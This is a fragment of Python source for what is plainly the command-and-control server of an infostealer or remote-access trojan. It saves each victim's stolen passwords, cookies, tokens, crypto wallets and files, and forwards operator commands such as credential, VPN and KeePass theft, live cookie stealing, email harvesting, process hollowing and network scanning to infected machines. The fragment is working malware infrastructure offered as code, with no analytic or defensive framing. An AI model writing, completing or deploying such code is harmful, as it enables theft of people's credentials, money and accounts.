...
def save_state():
    try:
        state = {
            'clients': {k: {kk: vv for kk, vv in v.items() if kk != 'sid' and kk != 'screen' and kk != 'webcam'} for k, v in clients.items()},
            'client_commands': {k: v for k, v in client_commands.items()},
            'client_stolen_data': {k: dict(v) for k, v in client_stolen_data.items()},
        }
    ...
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, 'r') as f:
                state = json.load(f)
            for cid, cdata in state.get('clients', {}).items():
                cdata['status'] = 'offline'
                clients[cid] = cdata
            for cid, cmds in state.get('client_commands', {}).items():
                client_commands[cid] = cmds
            for cid, sdata in state.get('client_stolen_data', {}).items():
                for key in ["passwords", "cookies", "tokens", "wallets", "files"]:
                    if key in sdata:
                        client_stolen_data[cid][key] = sdata[key]
    except:
        pass
...
# ── Module: Forward advanced module events to client ──
@socketio.on('lolbins')
def handle_lolbins(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('lolbins', data, room=client_id)

@socketio.on('network_scan')
def handle_network_scan(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('network_scan', data, room=client_id)

@socketio.on('steal_creds')
def handle_steal_creds(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('steal_creds', data, room=client_id)

@socketio.on('steal_vpn')
def handle_steal_vpn(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('steal_vpn', data, room=client_id)

@socketio.on('steal_auth')
def handle_steal_auth(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('steal_auth', data, room=client_id)

@socketio.on('harvest_email')
def handle_harvest_email(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('harvest_email', data, room=client_id)

@socketio.on('process_hollow')
def handle_process_hollow(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('process_hollow', data, room=client_id)

@socketio.on('scrape_keepass')
def handle_scrape_keepass(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('scrape_keepass', data, room=client_id)

@socketio.on('steal_live_cookies')
def handle_steal_live_cookies(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('steal_live_cookies', data, room=client_id)
